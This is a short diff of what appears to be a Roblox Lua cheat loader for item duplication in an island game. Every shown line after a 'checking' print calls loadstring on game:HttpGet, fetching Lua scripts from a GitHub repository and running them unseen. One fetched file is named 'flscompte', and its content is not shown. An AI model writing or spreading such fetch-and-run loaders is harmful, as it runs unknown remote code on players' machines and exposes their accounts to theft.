@@ -1,5 +1,5 @@
 print("checking")
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/fy010/FL-Dupe-fo-island/main/L1')))()
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/fy010/FL-Dupe-fo-island/main/duneksomg')))()
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/fy010/FL-Dupe-fo-island/main/Hugoguffroy')))()
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/fy010/FL-Dupe-fo-island/main/L1')))();
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/fy010/FL-Dupe-fo-island/main/duneksomg')))();
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/fy010/FL-Dupe-fo-island/main/Hugoguffroy')))();
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/fy010/FL-Dupe-fo-island/main/flscompte')))()
